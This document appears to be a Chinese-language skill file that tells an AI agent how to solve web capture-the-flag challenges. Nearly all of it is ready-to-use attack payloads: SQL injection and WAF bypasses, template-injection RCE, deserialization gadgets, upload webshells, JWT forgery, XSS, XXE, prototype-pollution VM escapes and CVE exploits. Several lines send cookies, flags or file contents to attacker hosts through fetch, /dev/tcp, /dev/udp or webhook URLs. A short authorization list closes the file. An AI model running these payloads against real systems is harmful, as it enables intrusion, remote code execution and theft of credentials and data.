# Web CTF Skill (v9 增强版)

## 解题顺序

1. 用 curl/http_request 访问目标 URL，分析响应
2. 检查源代码中的隐藏字段、注释、JS逻辑
3. 根据题目类型选择攻击方式
4. 构造 payload 并验证
5. 提取 flag 并提交

## curl 使用提示

- 加 `-s` 静默模式，`-k` 忽略证书错误
- URL 编码：`%0a` = 换行符，`%20` = 空格
- GET 参数用 `?` 和 `&` 连接
- 例：`curl -sk 'https://target/?c=tac%20flag.php%0a'`
- **检查响应头**：`curl -sI` 或 `curl -sv` — flag 可能隐藏在自定义头（`x-flag`, `x-archive-tag`）

## PHP 命令执行绕过

### 分号/换行符绕过
- 系统拼接 `>/dev/null 2>&1` 时：用换行符 `%0a` 让重定向仅作用于空行
- 例：`c=ls%0a` → 第一行执行 ls，第二行为空被重定向
- `c=ls;` 也可绕过（若分号未被过滤）

### 管道绕过
- `c=ls||` → 管道到空命令，输出仍可见
- `c=ls|` → 同理

### cat 替代
- `tac` / `nl` / `more` / `less` / `head` / `tail` / `sort` / `rev` / `od` / `sed -n p` / `awk '{print}'`
- 通配符：`cat f*` / `cat flag???`

### 空格绕过
- `${IFS}` / `$IFS` / `{cat,flag.php}`

### Bash 大括号展开（空格被过滤时）
```bash
{ls,-la,../..}
# 大括号展开插入空格: ls -la ../..
# 外带数据（TCP被阻断时）:
<({ls,-la,../..}>/dev/udp/ATTACKER_IP/53)
```

---

## SQL 注入

### 基础注入
- 联合查询：`' UNION SELECT 1,flag FROM flags--`
- 盲注：布尔/时间
- 报错注入：`extractvalue`/`updatexml`

### 反斜杠绕过引号转义
```bash
# Query: SELECT * FROM users WHERE username='$user' AND password='$pass'
# username=\ → WHERE username='\' AND password='...'
curl -X POST http://target/login -d 'username=\&password= OR 1=1-- '
```

### 二次注入
1. 注册恶意用户名：`' UNION select flag, CURRENT_TIMESTAMP from flags where 'a'='a`
2. 正常登录后查看 profile → 存储的 SQL 被执行

### MySQL 列截断 (VARCHAR 溢出)
```bash
# VARCHAR(20) 列 — 用空格填充 "admin" 超过列宽
curl -X POST http://target/register -d 'login=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=attacker123'
# MySQL 截断后 "admin" + 空格 == "admin"（PAD SPACE 排序规则）
```

### WAF 绕过技巧

**双关键字嵌套**（单次替换过滤器）：
```sql
sselectelect → select  (去掉内嵌的 select 后重建)
ununionion → union
frofromm → from
```

**XML 实体编码**（WAF 阻止 UNION/SELECT 时）：
```xml
<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users</storeId>
```

**EXIF 元数据注入**：
```bash
exiftool -Comment="' UNION SELECT password FROM users--" image.jpg
# WAF 通常不检查二进制文件内容
```

**PCRE 回溯限制绕过**：
```python
# PHP preg_match 在回溯超过 1,000,000 次时返回 false
# !false == true → WAF 被绕过
payload = "union select 1,2,3-- " + "a" * 1000001
```

**Shift-JIS 编码**：`¥`(U+00A5) 在 Shift-JIS 中映射到 `\`(0x5C)，导致转义失败

**BETWEEN 同义反复**（= 和数字被过滤）：
```sql
id BETWEEN id AND id  -- 永真
-- 盲注: SUBSTR(flag,1,1) BETWEEN 'a' AND 'z'
```

**PROCEDURE ANALYSE()**（information_schema 被阻止时）：
```sql
SELECT * FROM users PROCEDURE ANALYSE()  -- 泄露列名
```

**innodb_table_stats**（information_schema 被 WAF 阻止时）：
```sql
SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database()
```

**Host 头注入**：
```bash
curl -H "Host: ' UNION SELECT table_name,2,3 FROM information_schema.tables-- " http://target/
# Host 头通常不被 WAF 检查
```

**引号相邻 UNION**（WAF 检查 " UNION "）：
```sql
aggies'UNION SELECT 1; #   -- 无空格，引号充当分隔符
```

**内联注释跨字段分割**：
```text
username = '/*
password = */ OR 1=1 --
```

### SQLite 盲注（无 SLEEP 函数）
```sql
-- 用 randomblob() 替代 SLEEP():
admin' and password like 'f%' and 1=randomblob(300000000)--
```

### INSERT ON DUPLICATE KEY UPDATE 密码覆写
```sql
-- 无 SELECT 权限时，通过 INSERT 覆写密码:
'),('','root','z')ON DUPLICATE KEY UPDATE password='hacked'#
```

### vsprintf 格式化字符串注入
```bash
# %1$c 将参数 39 转为 chr(39)='（单引号），绕过转义
curl -X POST http://target/login -d 'username=39&password=%1$c or 1=1-- -'
```

### SQLi → SSTI 链
```python
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
hex_payload = '0x' + payload.encode().hex()
# username=x\&password=) union select 1, {hex_payload}#
```

---

## SSTI (服务端模板注入)

### 检测
| 模板引擎 | 测试 payload | 预期结果 |
|----------|-------------|---------|
| Jinja2 | `{{7*7}}` | 49 |
| Twig | `{{7*'7'}}` | 7777777 |
| Mako | `${7*7}` | 49 |
| ERB | `<%= 7*7 %>` | 49 |
| Freemarker/Velocity | `${7*7}` | 49 |

### Jinja2 RCE
```python
# 基本 RCE
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Flask/Werkzeug:
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
# 无引号时（用 bytes）:
{{self.__init__.__globals__.__builtins__.__import__(self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()).popen('cat /flag').read()}}
# 引号被过滤时（关键字参数无需引号）:
{{player.__dict__.update(power_level=9999999) or player.name}}
# globals.__self__.exec() 绕过关键字过滤:
{{ globals.__self__.exec("imp" + "ort o" + "s;o" + "s.system('cat /flag')") }}
```

### Twig RCE
```twig
{# Twig 1.x #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{# Twig 3.x #}
{{['id']|map('system')|join}}
{{['cat /flag.txt']|map('passthru')|join}}
```

### Go Template
```go
{{.ReadFile "/flag.txt"}}
```

### EJS
```javascript
<%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM table').map(row=>row.col1+row.col2).join(" ") %>
```

### ERB (Ruby/Sinatra)
```ruby
# Sequel::DATABASES 绕过沙箱限制:
<%= Sequel::DATABASES.first.tables %>
<%= Sequel::DATABASES.first[:players].all %>
```

### Mako
```python
${__import__('os').popen('cat /flag.txt').read()}
# 或: <% import os; os.popen("id").read() %>
```

### Smarty CVE-2017-1000480
```text
# 模板 ID 注入 PHP 代码:
?id=*/system('id');/*
```

### Thymeleaf SpEL SSTI
```bash
# Spring FileCopyUtils 绕过 WAF:
${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File("/app/fl"+"ag.txt")))}
# 目录枚举:
${T(java.util.Arrays).toString(new java.io.File("/app").list())}
```

---

## SSRF

### 内网探测
- gopher:// 协议走私
- dict:// 协议

### Host 头 SSRF
```bash
curl -H "Host: attacker.ngrok-free.app" https://target/api/secret-object
# 服务端用 Host 头构造内部请求 → 请求发到攻击者服务器
```

### DNS Rebinding (TOCTOU)
```python
rebind_url = "http://7f000001.external_ip.rbndr.us:5001/flag"
```

### 未转义点正则绕过
```bash
# 正则 /meepwntube.0x1337.space$/ (点未转义)
# 注册 meepwntubex0x1337.space → A 记录 127.0.0.1
```

### Apache mod_vhost_alias
```http
GET /shell.php HTTP/1.1
Host: ../admin
```

### SNI FTP 协议走私
```text
# TLS ClientHello SNI 字段编码 FTP 命令:
https://ip8.8.8.8.aaaaaa...aaa.127.0.0.1.xip.io:1212/
```

---

## PHP 类型混淆与绕过

### 类型比较 (==)
| 比较 | 结果 | 原因 |
|------|------|------|
| `0 == "php"` | `true` | 非数字字符串→0 |
| `"0e123" == "0e456"` | `true` | 科学记数法→0 |
| `NULL == ""` | `true` | 均为 falsy |

**JSON 类型混淆**：
```bash
curl -X POST http://target/login -H 'Content-Type: application/json' -d '{"password": 0}'
# PHP: 0 == "any_non_numeric_string" → true
```

**strcmp 数组绕过**：
```bash
curl http://target/login -d 'password[]=anything'
# strcmp(array, string) → NULL → !NULL == true
```

**Magic Hash**：
```text
md5("240610708") = "0e462097431906509019562988736854"
md5("QNKCDZO")   = "0e830400451993494058024219903391"
# 0e 开头的 MD5 互相 == 为 true
```

### hash_hmac 数组返回 NULL
```python
# nonce[]=x → hash_hmac 返回 NULL → 后续 HMAC 用空密钥
known_token = hmac.new(b'', b'gimmeflag', hashlib.sha256).hexdigest()
requests.post("http://target/getflag", data={"nonce[]": "x", "token": known_token})
```

### parse_str 变量注入
```bash
# parse_str($_SERVER['QUERY_STRING']); → 覆盖 $hashed_password
curl "http://target/auth.php?password=anything&hashed_password=$(php -r 'echo md5("anything");')"
```

### PHP 变量变量 ($$var)
```bash
# $$key = $$value 循环 → ?_200=flag 将 $flag 的值赋给 $_200
curl "http://target/page.php?_200=flag"
```

### extract() 变量覆写
```text
GET /?_BHVAR[db][host]=attacker.com&_BHVAR[db][user]=root
# extract($_GET) → 覆盖数据库连接参数
```

### (int) 类型转换路径穿越
```text
id=-4133353959107185265/../../admin
# (int) 返回 -4133353959107185265（通过数值检查），但原始字符串携带 ../
```

### log()/INF 数学等式
```bash
# INF == INF 为 true → 7E1000 产生 INF
curl 'http://target/?val1=a&val2=1&val3=1&val4=7E1000'
```

---

## PHP 文件包含 / LFI

```bash
# 源码泄露（不执行 PHP）:
curl "http://target/?page=php://filter/convert.base64-encode/resource=config"
# 解码: echo "PD9waHAg..." | base64 -d

# 常见 LFI 目标:
/etc/passwd
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
php://filter/convert.base64-encode/resource=index

# PHP7 filter chains RCE:
php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|.../resource=php://temp
```

### /proc 过滤绕过
```bash
# /dev/fd 是 /proc/self/fd 的符号链接:
curl "http://target/?f=/dev/fd/../environ"
# /dev/fd/3 通常是数据库或配置文件
```

---

## 命令注入

### 换行符绕过
```bash
curl -X POST http://target/ -d "ip=127.0.0.1%0acat%20flag.txt"
```

### 不完整黑名单
- `cat` 被阻：`sed -n p flag.txt`，`awk '{print}'`，`tac flag.txt`
- 常被遗漏：`;` 分号、反引号、`$()` 替换

### Git CLI 换行注入
```text
GET /file/test%22%0acat%20/home/ctf/flag.txt%0aecho%20%22
```

### Barcode 拼接注入
- 多个条码拼接 → 第二个条码含恶意命令
- `montage valid.png malicious.png -tile 2x1 combined.png`

### Sendmail 参数注入
```bash
mail=' -bp|cat SECRETS/backdoor123.php #
```

### 未锚定正则
```php
// 缺少 $ 锚:
preg_match('/^(\d{1,3}\.){3}\d{1,3}/', $ip)  // 没有 $
// 绕过: 1.1.1.1;cat /flag.txt
```

---

## PHP 代码执行

### eval() 字符限制
```php
echo`cat *`;       // 12 字符
`$_GET[0]`;        // 11 字符 — 实际命令在 URL 参数中
```

### assert() 注入
```text
?page=' and die(system('cat /flag')) or '
# assert("strpos('' and die(system('cat /flag')) or '', '..') === false");
```

### preg_replace /e 修饰符
```php
// PHP 5.x only:
preg_replace("/pattern/e", "system('cat /flag')", $input);
```

### create_function 注入
```text
order=;system($_GET[c]);return 0;//
&c=id
```

### eval 绕过 — current(getallheaders())
```bash
# 正则只允许 单函数调用:
curl "http://target/?cmd=eval(current(getallheaders()));" -H "Zzz: system('cat /flag');"
```

### 反引号 + 字符限制
```php
echo`ls`;       // 9 字符 — 目录列表
`$_GET[x]`;     // 实际命令通过 ?x= 传递
```

---

## 反序列化

### PHP 反序列化
```text
# Cookie 中 base64 编码的序列化数据 → unserialize() 目标
O:8:"FilePath":1:{s:4:"path";s:8:"flag.txt";}
```

**长度操控**（filter word expansion）：
```text
# "where"(5) → "hacker"(6) 每次替换多 1 字节
# 序列化长度字段与实际长度不匹配 → 注入额外字段
```

**SoapClient CRLF SSRF**：
```php
$payload = array(
    'uri' => "http://127.0.0.1/\r\nContent-Length:0\r\n\r\nPOST /index.php?action=login ...",
    'location' => 'http://127.0.0.1/'
);
$soap = new SoapClient(null, $payload);
// __call() 触发时发送构造的 HTTP 请求
```

### Python Pickle
```python
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))
payload = base64.b64encode(pickle.dumps(RCE())).decode()
```

**Pickle STOP opcode 链**：
```python
# 去掉第一个 payload 的 STOP opcode，拼接第二个
payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
```

### Java 反序列化 (ysoserial)
```bash
# 检测: base64 解码后以 AC ED 00 05 开头
java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' | base64
# 盲检测: URLDNS gadget → DNS 回调
java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net' | base64
```

### .NET JSON TypeNameHandling
```json
{"$type": "System.Diagnostics.Process, System", "StartInfo": {"FileName": "cmd.exe", "Arguments": "/c calc.exe"}}
```

---

## 文件上传 → RCE

### .htaccess 上传
```text
1. 上传 .htaccess: AddType application/x-httpd-php .lol
2. 上传 rce.lol: <?php system($_GET['cmd']); ?>
3. 访问 rce.lol?cmd=cat+flag.txt
```

### PHP 扩展名绕过
```text
.php .phtml .phps .php3 .php4 .php5 .php7 .phar
# 双扩展名: .png.php, .jpg.phtml
```

### PNG/PHP Polyglot
```bash
cp valid_image.png polyglot.png.php
cat >> polyglot.png.php << 'PAYLOAD'
<?php
$files = scandir('/');
foreach ($files as $f) {
    if (strpos($f, 'flag') !== false) echo file_get_contents("/$f");
}
?>
PAYLOAD
```

### BMP 像素 Webshell + 文件名截断
```python
# 文件名: "A"*46 + ".php" + ".JPG" (54 chars, 截断为 50 → ".php")
# BMP 像素 BGR 值编码 PHP 代码
```

### .phar 扩展名
```text
# Apache 也解析 .phar 为 PHP
# 上传黑名单常遗漏 .phar
```

### PHP Log Poisoning
```text
1. User-Agent 注入 PHP payload
2. LFI 包含: ....//....//var/log/apache2/access.log
```

### Python .so 劫持
```text
1. gcc -shared -fPIC -o auth.so malicious.c (含 __attribute__((constructor)))
2. 路径穿越上传: {"filename": "../utils/auth.so"}
3. 删 .pyc 强制重导入: {"filename": "../utils/__pycache__/auth.cpython-311.pyc"}
```

### Zip Symlink 路径穿越
```bash
ln -s /path/to/flag.txt file.txt
zip -y exploit.zip file.txt
```

### ZipSlip + SQLi
上传 zip 含符号链接读文件，路径穿越写文件。

---

## JWT / JWE 攻击

### Algorithm None
```json
{"alg": "none", "typ": "JWT"}
```

### RS256 → HS256 算法混淆
```javascript
const token = jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });
```

### 弱密钥爆破
```bash
flask-unsign --decode --cookie "eyJ..."
hashcat -m 16500 jwt.txt wordlist.txt
```

### 未验证签名
```python
# 修改 payload 后重编码，签名未检查:
parts = token.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
payload['sub'] = 'administrator'
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged = f"{parts[0]}.{new_payload}.{parts[2]}"
```

### JWK Header 注入
```python
# 在 JWT header 中嵌入攻击者生成的 RSA 公钥:
forged = jwt.encode({"sub": "admin"}, attacker_private_key, algorithm='RS256', headers={'jwk': jwk})
```

### JKU Header 注入
```python
# JKU URL 指向攻击者服务器的 JWKS:
forged = jwt.encode({"sub": "admin"}, attacker_private_key, algorithm='RS256', headers={'jku': 'https://attacker.com/.well-known/jwks.json'})
```

### KID 路径穿越
```python
# /dev/null → 空 HMAC 密钥:
forged = jwt.encode({"sub": "admin"}, '', algorithm='HS256', headers={"kid": "../../../dev/null"})
# KID SQL 注入: ' UNION SELECT 'known-secret' --
```

### JWT Balance Replay
1. 注册 → 获取有余额的 JWT
2. 消费后替换旧 JWT → 余额恢复
3. 退货 → 余额叠加

### JWE Token 伪造
```python
# 公钥加密 = 服务端用私钥解密 → 拥有公钥即可伪造:
from jwcrypto import jwk, jwe
key = jwk.JWK.from_pem(public_key_pem.encode())
token = jwe.JWE(json.dumps({"role": "admin"}).encode(), recipient=key,
    protected=json.dumps({"alg": "RSA-OAEP-256", "enc": "A256GCM"}))
forged_jwe = token.serialize(compact=True)
```

---

## XSS

### 基本 Payload
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

### Cookie 外带
```html
<script>fetch('https://exfil.com/?c='+document.cookie)</script>
```

### 过滤器绕过
```html
<ScRiPt>alert(1)</ScRiPt>           <!-- 大小写混合 -->
<script>alert`1`</script>           <!-- 模板字面量 -->
<img src=x onerror=alert&#40;1&#41;> <!-- HTML 实体 -->
<svg/onload=alert(1)>               <!-- 无空格 -->
```

### Unicode 大小写折叠绕过
```html
<!-- ſ (U+017F) 被 Go strings.EqualFold 折叠为 's' -->
<ſcript>location='https://webhook.site/ID?c='+document.cookie</ſcript>
```

### React 输入程序化填充
```javascript
const nativeSetter = Object.getOwnPropertyDescriptor(
  window.HTMLInputElement.prototype, 'value').set;
nativeSetter.call(input, 'desired_value');
input.dispatchEvent(new Event('input', { bubbles: true }));
```

### AngularJS 1.x 沙箱逃逸
```javascript
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,window.location="http://attacker.com/"+document.cookie,a')}}
```

### jQuery DOM XSS (hashchange)
```html
<iframe src="https://vulnerable.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

### Shadow DOM XSS
```javascript
// Proxy 拦截 attachShadow:
var _r, _o = Element.prototype.attachShadow;
Element.prototype.attachShadow = new Proxy(_o, {
  apply: (t, a, b) => { _r = Reflect.apply(t, a, b); return _r; }
});
// 间接 eval 逃逸: (0,eval)('code')
```

### JPEG+HTML Polyglot
```python
# 有效 JPEG 头 + HTML payload → 同时是有效 JPEG 和 HTML
polyglot = jpeg_data + b'\n' + html_payload.encode()
# 外带方式: 自上传 / webhook / DNS
```

### javascript: URL Scheme (Admin Bot)
```bash
# new URL() 只验证语法，不检查协议:
curl -X POST 'https://target/report' --data-urlencode "url=javascript:fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/ID/?flag='+encodeURIComponent(f))"
```

### JSFuck 解码
```javascript
// 去掉末尾 ()() 后 eval:
const func = eval(code.slice(0, -2));
console.log(func.toString());  // 显示原始代码
```

---

## CSP 绕过

### Hyperscript CDN
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.12/hyperscript.min.js"></script>
<div _="on load fetch '/api/ticket' then put document.cookie into its body"></div>
```

### base 标签劫持（缺 base-uri 指令）
```html
<base href="https://attacker.com/">
<script nonce="abc123" src="test.js"></script>
<!-- test.js 从 attacker.com 加载 -->
```

### 云函数白名单域
```text
CSP 允许 *.us-central1.run.app → 部署恶意云函数
```

### link prefetch
```html
<link rel="prefetch" href="http://attacker.com/steal?data=SECRET">
<meta http-equiv="refresh" content="0; url=http://attacker.com/steal">
```

### 自定义 Content-Type (script-src 'self')
```text
/xss?xss=payload&mimis=jscript → Content-Type: application/javascript
<script src="/xss?xss=payload&mimis=jscript"></script>
```

### CSS @font-face unicode-range 数据外带
```css
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=a'); unicode-range: U+0061; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=b'); unicode-range: U+0062; }
.target { font-family: exfil; }
/* 浏览器仅为存在的字符加载字体 → 泄露字符集 */
```

---

## XXE

### 基本 XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### OOB XXE (外部 DTD)
```xml
<!-- 远程 DTD: -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-SERVER/flag?b64=%file;'>">
%eval; %exfil;
```

### DOCX/Office XML 上传
```bash
# 修改 [Content_Types].xml 注入 XXE → 重新打包 DOCX
```

### SVG → PNG 管道
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="15">&dat;</text>
</svg>
<!-- XXE 实体渲染到 PNG 图片中 -->
```

### 外部 DTD 绕过滤
```xml
<!-- 上传的 XML 不含敏感关键词 → 外部 DTD 被 HTTP 获取后才处理 -->
<!DOCTYPE book SYSTEM "http://webhook.site/TOKEN">
<book><title>&leak;</title></book>
```

---

## 路径穿越

### 递归替换绕过
```text
....// → ../  (单次 str_replace('../', '', $path))
Accept-Language: ....//....//....//....//flag
```

### 双 URL 编码
```text
%252E%252E%252F → ../ (两次解码后)
```

### Python os.path.join
```python
os.path.join('/app/public', '/etc/passwd')  # → '/etc/passwd'（绝对路径忽略前缀）
```

### Nginx Alias 穿越泄露 .env
```bash
# location /laravel { alias /var/www/html/public/; }
GET /laravel../.env  # → /var/www/html/.env
```

### Unicode 同形字
```text
U+2E2E (⸮) → . (NFKC 规范化)
%E2%B8%AE%E2%B8%AE/flag.txt → ../flag.txt
```

### URL 编码斜杠
```bash
curl 'https://target/public%2f../nginx.conf'
# Nginx 路由匹配不解码 %2f，文件系统解码
```

---

## GraphQL 注入

### 内省查询
```graphql
{__schema{types{name,fields{name,args{name,type{name}}}}}}
{__schema{mutationType{fields{name,args{name,type{name}}}}}}
```

### 批量/别名绕过速率限制
```graphql
mutation {
  a1: increaseVote(id: "target") { count }
  a2: increaseVote(id: "target") { count }
  # ... 重复 1337 次
}
```

### 字符串插值注入
```javascript
// userInput = ") { result } } mutation { adminAction(secret: true) { flag } } #"
```

---

## 竞态条件

```python
import asyncio, aiohttp

async def race(url, data, headers, n=20):
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, json=data, headers=headers) for _ in range(n)]
        responses = await asyncio.gather(*tasks)

# 常见目标: 双重消费 / 优惠券重用 / 注册唯一性
```

---

## Node.js 原型链污染 & VM 逃逸

### 污染向量
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

### flatnest 循环引用绕过 (CVE-2023-26135)
```json
{"x": "[Circular (constructor.prototype)]", "x.settings.enableJavaScriptEvaluation": true}
```

### Lodash → Pug AST 注入
```json
{"constructor": {"prototype": {"block": {"type": "Text", "line": "1;pug_html+=global.process.mainModule.require('fs').readFileSync('/app/flag.txt').toString();//", "val": "x"}}}}
```

### VM 沙箱逃逸
```javascript
// CommonJS:
const F = this.constructor.constructor; const proc = F("return process")(); proc.mainModule.require("child_process").execSync("id");
// ESM (CVE-2025-61927):
const F = this.constructor.constructor; const proc = F("return globalThis.process")();
const spawnSync = proc.binding("spawn_sync");
const result = spawnSync.spawn({file: "/bin/sh", args: ["/bin/sh", "-c", "cat /flag*"], ...});
```

### 完整链: 污染 → VM 逃逸 RCE
```python
# 1. 原型链污染启用 JS eval
pollution = {"x": "[Circular (constructor.prototype)]", "x.settings.enableJavaScriptEvaluation": True}
requests.post(f"{TARGET}/config", json=pollution)
# 2. VM 逃逸
rce_script = """const F=this.constructor.constructor;const proc=F("return globalThis.process")();..."""
requests.post(f"{TARGET}/render", json={"html": f"<script>{rce_script}</script>"})
```

---

## CVE 快速参考

### CVE-2025-29927: Next.js 中间件绕过
```http
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

### CVE-2021-22204: ExifTool DjVu Perl 注入
```python
# DjVu ANTa chunk 中的 Perl eval:
ant_data = f'(metadata "\\c${{{command}}}")'.encode()
```

### CVE-2025-8110: Gogs Symlink RCE
```text
1. 创建 repo, ln -s .git/config malicious_link, push
2. API 更新 malicious_link → 覆写 .git/config
3. 注入 core.sshCommand 反弹 shell
```

### CVE-2024-28184: WeasyPrint 附件 SSRF
```html
<a rel="attachment" href="http://127.0.0.1/admin/flag">
<!-- 或: <link rel="attachment" href="file:///flag.txt"> -->
```

### CVE-2023-27350: PaperCut NG 认证绕过 + RCE
```text
1. /app?service=page/SetupCompleted → 未认证管理员会话
2. 启用 script.enabled, 禁用 script.sandboxed
3. RhinoJS 脚本注入: java.lang.Runtime.getRuntime().exec(...)
```

### Uvicorn CRLF 注入
```python
# Uvicorn 不清理响应头中的 CRLF:
payload = {"headers": {"lol\r\n\r\n<script>evil()</script>": "x"}}
```

### Python urllib Scheme 绕过
```text
# <URL:http://attacker.com/evil> → urlsplit 返回空 scheme，但 urlretrieve 仍请求
```

---

## 其他技巧

### Ruby 代码注入
```ruby
# instance_eval 突围:
valid');PAYLOAD#
# 关键字替代: File.read → Kernel#open; system → open('|cmd'), %x[cmd], Process.spawn
# ObjectSpace 堆扫描:
ObjectSpace.each_object(String) { |x| x[0..3] == "TWCT" and print x }
```

### LaTeX 注入
```latex
\input{|"cat /flag.txt"}
```

### Prolog 注入
```text
3), exec(cat('/flag')), write('\n'
```

### Redis Lua 注入
```lua
-- 123') and redis.call('get', 'admin') --
```

### 编辑器备份文件泄露
```text
file~       (gedit/nano)
.file.swp   (vim)
#file#      (emacs)
.bak, .orig
```

### date -f 任意文件读取
```bash
date -f /flag.txt  # 错误信息中包含文件内容
```

### Apache mod_rewrite PATH_INFO 绕过
```bash
curl http://target/index.php/getflag  # 绕过 /getflag 的直接访问限制
```

### PHP ReDoS 跳过代码执行
```text
# preg_match 超时返回 false → 后续 ACL INSERT 被跳过 → 无限制
ADMIN-' + '-'*50 + '!'   # 强制完全回溯
```

### 自定义序列化器整数溢出
```text
# chr(256) = \x00 → 长度 0 → 数据溢出到后续字段
# 单字节长度字段在 256 处溢出
```

### PHP7 OPcache + LD_PRELOAD 绕过 disable_functions
```text
1. SQLi 写入 .bin 文件到 OPcache 目录
2. putenv("LD_PRELOAD=evil.so") + mail() → 绕过 disable_functions
```

### EXIF ImageDescription Shell 注入
```bash
exiftool -ImageDescription="Santa ; /bin/bash -c 'cat /opt/flag > /dev/tcp/attacker/8081'" evil.jpg
```

### FTP 笑脸后门 (vsftpd 2.3.4)
```bash
ftp target 21
USER anonymous:)
nc target 6200
```

### HTTP 请求走私 (缓存代理)
```python
# 缓存代理返回缓存响应但不消费请求体 → 剩余字节被解析为下一个请求
inner_req = f"POST /create HTTP/1.1\r\nCookie: session={admin_session}\r\n..."
```

### React 组件状态提取
```javascript
const key = Object.keys(document.querySelector('[data-react-root]'))
  .find(k => k.startsWith('__reactInternalInstance$'));
const state = document.querySelector('[data-react-root]')[key].return.stateNode.state;
```

### DOM 篡改
```html
<form id="config"><input name="canAdminVerify" value="1"></form>
<!-- window.config.canAdminVerify == truthy -->
```

### CSS/JS 付费墙绕过
```bash
curl -s https://target/article | grep -i "flag\|CTF{"
# 付费墙是 DOM 覆盖层 — 原始 HTML 包含完整内容
```

### robots.txt User-Agent 差异
```bash
curl -s -A 'Googlebot/2.1' http://target/robots.txt
# 不同 UA 可能返回不同的内容
```

### 隐藏 DOM 元素
```javascript
document.querySelectorAll('[style*="display: none"], [hidden]')
  .forEach(el => console.log(el.textContent));
```

## 安全边界

- **必须** authorized=true 才能联网
- 只能访问题目指定的目标
- 不爆破真实外部服务
- 不使用社工/钓鱼
- 不攻击非授权目标
- 不修改其他用户数据
